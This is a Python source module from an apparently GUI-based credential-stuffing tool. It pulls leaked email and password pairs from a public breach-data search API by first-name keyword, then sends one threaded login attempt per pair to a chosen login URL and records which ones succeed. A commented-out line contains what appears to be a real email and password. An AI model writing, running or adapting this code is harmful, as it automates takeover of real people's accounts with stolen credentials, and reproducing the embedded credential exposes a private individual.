import threading

import requests

from global_functions import send_request
from gui.credential_stuffing.credential import Credential
from gui.credential_stuffing.process_manager import is_stopped
from gui.credential_stuffing.success_manager import add_tested_credential, add_finish, add_failed_request
from gui.utils.console_view import ConsoleView

global_credentials_list = [
    # Credentials("pppbbb616000@gmail.com", "jRez.LZ4J9E!3Du")
]
keywords = [
    "Liam",
    "Emma",
    "Noah", "Ava", "Oliver", "Isabella", "Elijah", "Sophia",
    # "James",
    # "Amelia", "Benjamin", "Mia", "William", "Charlotte", "Lucas", "Evelyn", "Henry", "Abigail", "Alexander",
    # "Harper", "Jack", "Ella", "Daniel", "Scarlett", "Matthew", "Aria", "Samuel", "Grace", "Jackson",
    # "Lily", "Sebastian", "Chloe", "Gabriel", "Ella", "Carter", "Nora", "Michael", "Zoey", "Wyatt",
    # "Isla", "John", "Layla", "Luke", "Mila", "Isaac", "Lucy", "Joshua", "Riley", "Andrew", "Sadie",
    # "Nathan", "Ruby", "Christopher", "Stella", "Joseph", "Victoria", "David", "Alice", "Aiden", "Maya",
    # "Anthony", "Penelope", "Eli", "Savannah", "Matthew", "Lily", "Dylan", "Audrey", "Caleb", "Zoey",
    # "Asher", "Bella", "Levi", "Luna", "Thomas", "Eleanor", "Hunter", "Scarlett", "Aaron", "Hazel",
    # "Julian", "Audrey", "Adam", "Mila", "Ryan", "Ellie", "Connor", "Nova", "Owen", "Lily", "Carson",
    # "Chloe", "Jaxon", "Emilia", "Mason", "Arlo", "Madeline", "Kai", "Brooklyn"
]


def get_credentials_from_api(query, console_view: ConsoleView, limit=10):
    credential_list = []

    fetch_msg = f"[INFO] Fetching credentials for query '{query}'"
    console_view.add_text_schedule(fetch_msg)
    print(fetch_msg)

    url = f"https://api.proxynova.com/comb?query={query}&limit={limit}"

    response = requests.get(url)
    data = response.json()

    if response.status_code == 200:
        count = str(len(data["lines"]))
        found_msg = f"[INFO] Found {count} entries for query {query}"
        console_view.add_text_schedule(found_msg)
        print(found_msg)

        if len(data["lines"]) > 0:
            for line in data["lines"]:
                try:
                    parts = line.split(":")
                    credential_list.append(Credential(parts[0], parts[1]))
                except IndexError as e:
                    try:
                        parts = line.split(";")
                        credential_list.append(Credential(parts[0], parts[1]))
                    except IndexError as e:
                        pass

        else:
            not_found_msg = f"[ERROR] Could not find any credentials for query {query}"
            add_failed_request(query)
            console_view.add_text_schedule(not_found_msg)
    else:
        error_msg = f"[ERROR] Error: {response.status_code} for {query} | {data['error']}"
        add_failed_request(query)
        console_view.add_text_schedule(error_msg)

    return credential_list


def credential_stuffing(username_var, password_var, login_success_var, url, headers, console_view: ConsoleView, keyword,
                        credential_limit=10, credential_list=None):
    if credential_list is None:
        credential_list = get_credentials_from_api(keyword, console_view, int(credential_limit))

    if len(credential_list) > 0:
        for credential in credential_list:
            if is_stopped():
                break

            threading.Thread(target=send_request_instance,
                             args=(username_var, credential.username, password_var, credential.password,
                                   login_success_var, url, headers, console_view, keyword)).start()


def send_request_instance(username_var, username_value, password_var, password_value,
                          login_success_var, url, headers, console_view: ConsoleView, keyword):
    credential = Credential(username_value, password_value)

    if send_request(username_var, credential.username, password_var, credential.password,
                    login_success_var, url, headers, console_view):
        credential.success = True

    if keyword != "None": add_finish(keyword)
    add_tested_credential(credential)
